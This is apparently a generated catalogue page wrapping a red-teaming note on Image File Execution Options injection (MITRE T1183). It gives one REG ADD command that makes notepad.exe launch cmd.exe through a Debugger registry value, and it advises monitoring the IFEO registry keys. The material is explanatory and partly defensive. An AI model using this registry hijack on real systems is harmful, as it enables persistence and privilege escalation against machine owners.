---
parsed_by: focuslocust
source: redteamingtactics
type: generated
---
# Image File Execution Options Injection

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `redteamingtactics` |
| Type | `redteaming-topic` |
| Record ID | `rtt-offensive-security-privilege-escalation-t1183-image-file-execution-options-injection` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/redteaming-tactics-and-techniques/offensive-security/privilege-escalation/t1183-image-file-execution-options-injection.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [Image File Execution Options Injection](../../topics/offensive-security/image-file-execution-options-injection.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | rtt-offensive-security-privilege-escalation-t1183-image-file-execution-options-injection |
| name | Image File Execution Options Injection |
| type | redteaming-topic |
| source | redteamingtactics |
| url | https://github.com/mantvydasb/RedTeaming-Tactics-and-Techniques/blob/master/offensive-security/privilege-escalation/t1183-image-file-execution-options-injection.md |

## Preserved Source Material

````yaml
_asset_filenames:
- ifeo-cmdline.png
- ifeo-cmdline2.png
- ifeo-notepad.png
- ifeo-notepad2.png
_body: '---

  description: ''Defense Evasion, Persistence, Privilege Escalation''

  ---


  # Image File Execution Options Injection


  ## Execution


  Modifying registry to set cmd.exe as notepad.exe debugger, so that when notepad.exe is executed, it will actually start
  cmd.exe:


  {% code title="attacker@victim" %}

  ```csharp

  REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe" /v Debugger /d "cmd.exe"

  ```

  {% endcode %}


  Launching a notepad on the victim system:


  ![](../../.gitbook/assets/ifeo-notepad.png)


  Same from the cmd shell:


  ![](../../.gitbook/assets/ifeo-notepad2.png)


  ## Observations


  Monitoring command line arguments and events modifying registry keys: `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image
  File Execution Options/<executable>` and `HKLM\SOFTWARE\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Image File Execution
  Options\<executable>` should be helpful in detecting this attack:


  ![](../../.gitbook/assets/ifeo-cmdline.png)


  ![](../../.gitbook/assets/ifeo-cmdline2.png)


  ## References


  {% embed url="https://attack.mitre.org/wiki/Technique/T1183" %}


  {% embed url="https://blogs.msdn.microsoft.com/mithuns/2010/03/24/image-file-execution-options-ifeo/" %}


  {% embed url="https://blogs.msdn.microsoft.com/reiley/2011/07/29/a-debugging-approach-to-ifeo/" %}'
_relative_path: offensive-security/privilege-escalation/t1183-image-file-execution-options-injection.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/redteaming-tactics-and-techniques/offensive-security/privilege-escalation/t1183-image-file-execution-options-injection.md
````
